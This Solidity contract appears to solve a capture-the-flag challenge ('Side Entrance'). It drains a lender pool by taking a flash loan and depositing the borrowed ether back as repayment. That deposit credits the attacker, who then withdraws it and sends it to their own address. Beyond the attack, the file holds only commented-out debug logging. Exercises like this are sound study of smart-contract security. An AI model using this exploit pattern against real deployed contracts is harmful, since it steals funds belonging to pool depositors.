// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

// import "hardhat/console.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool public pool;
    address payable attacker;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(msg.sender);
    }

    function drain(uint256 amount) public {
        // console.log("msg.sender: %s", msg.sender);
        // console.log("Draining amount: %s", amount);

        // console.log("initial stats: ");
        // console.log("pool balance: ");
        // console.log(address(pool).balance);
        // console.log("attack contract balance: ");
        // console.log(address(this).balance);
        // console.log("attacker balance: ");
        // console.log(address(attacker).balance);

        pool.flashLoan(amount);
        // console.log("after flash loan");
        // console.log("pool balance: ");
        // console.log(address(pool).balance);
        // console.log("attack contract balance: ");
        // console.log(address(this).balance);
        // console.log("attacker balance: ");
        // console.log(address(attacker).balance);

        pool.withdraw();
        // console.log("after withdraw");
        // console.log("pool balance: ");
        // console.log(address(pool).balance);
        // console.log("attack contract balance: ");
        // console.log(address(this).balance);
        // console.log("attacker balance: ");
        // console.log(address(attacker).balance);

        attacker.transfer(address(this).balance);
        // console.log("after attacker transfer");
        // console.log("pool balance: ");
        // console.log(address(pool).balance);
        // console.log("attack contract balance: ");
        // console.log(address(this).balance);
        // console.log("attacker balance: ");
        // console.log(address(attacker).balance);
    }

    function execute() public payable {
        // console.log("inside execute");
        // console.log("address(this).balance: %s", address(this).balance);
        // console.log("msg.sender: %s", msg.sender); // pool
        // console.log("msg.value: %s", msg.value); // 1000000000000000000000
        // console.log("pool balance: ");
        // console.log(address(pool).balance);
        pool.deposit{value: address(this).balance}();
        // console.log("after deposit pool balance: %s", address(pool).balance);
        // console.log("address(this).balance: %s", address(this).balance);
    }

    receive() external payable {
        // console.log("receive() !!!");
        // console.log(address(this).balance);
        // console.log(address(attacker).balance);

        attacker.transfer(address(this).balance);
        // console.log("after attacker.transfer !!!");
        // console.log(address(this).balance);
        // console.log(address(attacker).balance);
    }
}
